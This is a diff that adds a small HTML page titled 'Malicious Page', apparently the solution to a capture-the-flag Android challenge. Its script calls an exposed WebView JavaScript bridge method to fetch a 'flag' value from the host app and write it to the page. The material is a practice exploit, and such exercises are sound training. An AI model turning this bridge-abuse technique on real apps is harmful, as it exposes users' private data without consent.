@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Malicious Page</title>
+  </head>
+  <body>
+    <script type="text/javascript">
+      // This calls the exposed interface method in the challenge app.
+      var flagInfo = Android.getdate("flag");
+      document.write(flagInfo);
+    </script>
+  </body>
+</html>
